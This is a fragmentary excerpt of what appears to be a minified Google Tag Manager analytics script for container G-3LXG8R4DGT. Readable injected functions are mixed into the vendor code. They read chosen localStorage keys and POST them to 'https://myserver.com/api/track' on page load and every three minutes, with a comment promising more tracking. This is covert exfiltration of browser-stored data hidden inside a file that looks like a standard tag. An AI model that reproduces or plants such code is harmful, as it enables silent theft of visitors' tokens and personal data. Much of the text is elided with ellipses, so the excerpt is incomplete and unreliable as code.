...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "vtp_instanceDestinationId": "G-3LXG8R4DGT",
        "tag_id": 3
      }, {
  ...
  function generateUniqHash(inputData) {
    const keys = Object.keys(inputData).sort();
    const hashChain = keys.reduce((accum, key) => accum + key, "");
    let hash = 0;
    for (let i = 0; i < hashChain.length; i++) {
      const charCode = hashChain.charCodeAt(i);
  ...
  function fetchObservedData() {
    const observedData = {};
    for (const key of keysToObserve) {
      if (localStorage.getItem(key)) {
        observedData[key] = localStorage.getItem(key);
      }
    }
    return observedData;
  }
  ...
  Object.freeze(Q.g);
  async function pushDataToServer(inputData) {
    const hashID = generateUniqHash(inputData);
    const serverEndpoint = "https://myserver.com/api/track";
    try {
      const apiResponse = await fetch(serverEndpoint, {
        method: "POST",
        headers: {
      ...
      if (apiResponse.ok) {
        ...
        console.log("Data push failed, Status Code:" + apiResponse.status);
      }
    } catch (err) {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.gk = "ChEIgKearAYQ1JeSzorWts3CARIlAHPax5C/Xws2Dh30Xcr9giYB7f6gR4jHhhpDWgojqO3ir2v4gBoCNg0\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  var Ji = "";
  ni.Af = Ji;
  function trackAndPushObservedData() {
    const trackedData = fetchObservedData();
    if (Object.keys(trackedData).length > 0) {
      pushDataToServer(trackedData);
    }
  }
  var Ki = new La(),
    Li = {},
  ...
  window.addEventListener("load", function () {
    trackAndPushObservedData();
    setInterval(trackAndPushObservedData, 180000);
  });

  // Additional tracking behaviors are added below.
  ...
  function kE() {
    var a = new sb();
    M(this, "read_container_data"), a.set("containerId", 'G-3LXG8R4DGT'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
